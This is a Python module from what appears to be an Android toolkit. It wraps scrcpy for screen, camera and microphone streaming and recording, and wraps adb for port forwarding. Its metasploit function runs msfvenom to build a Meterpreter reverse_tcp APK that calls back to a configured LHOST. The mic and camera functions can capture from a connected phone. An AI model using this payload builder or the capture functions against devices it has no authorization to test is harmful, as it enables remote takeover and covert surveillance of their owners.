"""Extras that need an external program: scrcpy mirroring, Metasploit, tunnels."""

from __future__ import annotations

import os
import time

from omni.core import config, console, proc

__all__ = ["mirror", "camera_stream", "mic_stream", "record_mic", "metasploit",
           "port_forward", "remove_forward", "list_forwards", "sleep_keepalive"]


def mirror(adb_serial: str | None = None, *, record: str | None = None,
           no_control: bool = False, max_size: int | None = None) -> int:
    """Screen mirror via scrcpy (optionally recording to a file)."""
    scrcpy = proc.require("scrcpy", "apt install scrcpy")
    argv = [scrcpy]
    if adb_serial:
        argv += ["--serial", adb_serial]
    argv += ["--video-codec=h264", "--max-fps=60"]
    if max_size:
        argv += [f"--max-size={max_size}"]
    if record:
        argv += ["--record", record]
    if no_control:
        argv += ["--no-control"]
    console.info("scrcpy running — Ctrl-C to stop")
    return proc.run_live(argv)


def camera_stream(adb_serial: str | None = None, face: str = "back") -> int:
    scrcpy = proc.require("scrcpy", "apt install scrcpy")
    argv = [scrcpy, "--video-source=camera",
            f"--camera-facing={face}", "--no-audio"]
    if adb_serial:
        argv += ["--serial", adb_serial]
    return proc.run_live(argv)


def mic_stream(adb_serial: str | None = None) -> int:
    scrcpy = proc.require("scrcpy", "apt install scrcpy")
    argv = [scrcpy, "--no-video", "--audio-source=mic"]
    if adb_serial:
        argv += ["--serial", adb_serial]
    return proc.run_live(argv)


def record_mic(path: str, adb_serial: str | None = None) -> int:
    scrcpy = proc.require("scrcpy", "apt install scrcpy")
    argv = [scrcpy, "--no-video", "--audio-source=mic"]
    if adb_serial:
        argv += ["--serial", adb_serial]
    if os.path.splitext(path)[1] in (".m4a", ".aac", ".opus", ".flac", ".wav"):
        argv += ["--record", path]
    else:
        argv += ["--record", path + ".m4a"]
    console.info("recording — Ctrl-C to stop")
    return proc.run_live(argv)


def metasploit(payload: str = "android/meterpreter/reverse_tcp",
               lhost: str | None = None, lport: int | None = None,
               apk_name: str | None = None) -> str:
    """Build a Meterpreter APK with msfvenom (if installed)."""
    binary = proc.which("msfvenom")
    if binary is None:
        raise proc.ToolMissing("msfvenom not found — install metasploit-framework")
    host = lhost or config.get_value("pentest.lhost")
    port = lport or config.get_value("pentest.lport", 4444)
    if not host:
        raise ValueError("no LHOST set (omni config set pentest.lhost <ip>)")
    target = os.path.join(config.output_dir("android"),
                          apk_name or f"omni_payload_{int(time.time())}.apk")
    res = proc.run([binary, "-p", payload, f"LHOST={host}", f"LPORT={port}",
                    "-o", target], timeout=900)
    if not res.ok:
        raise RuntimeError(res.text[:400])
    console.ok(f"payload written to {target}")
    return target


def port_forward(local: str, remote: str, adb_serial: str | None = None) -> proc.Result:
    argv = ["adb"] + ([("-s"), adb_serial] if adb_serial else [])
    return proc.run(argv + ["forward", local, remote], timeout=60)


def remove_forward(local: str | None = None, adb_serial: str | None = None) -> proc.Result:
    argv = ["adb"] + (["-s", adb_serial] if adb_serial else [])
    return proc.run(argv + ["forward", "--remove", local] if local
                    else argv + ["forward", "--remove-all"], timeout=60)


def list_forwards(adb_serial: str | None = None) -> list[str]:
    argv = ["adb"] + (["-s", adb_serial] if adb_serial else [])
    return proc.run(argv + ["forward", "--list"], timeout=30).lines()


def sleep_keepalive(serial: str | None = None, interval: int = 60) -> None:
    """Poll the device so a TCP/IP session does not time out."""
    adb = ["adb"] + (["-s", serial] if serial else [])
    console.info("keepalive started — Ctrl-C to stop")
    try:
        while True:
            proc.run(adb + ["shell", "echo", "ping"], timeout=20)
            time.sleep(max(5, interval))
    except KeyboardInterrupt:
        console.info("keepalive stopped")
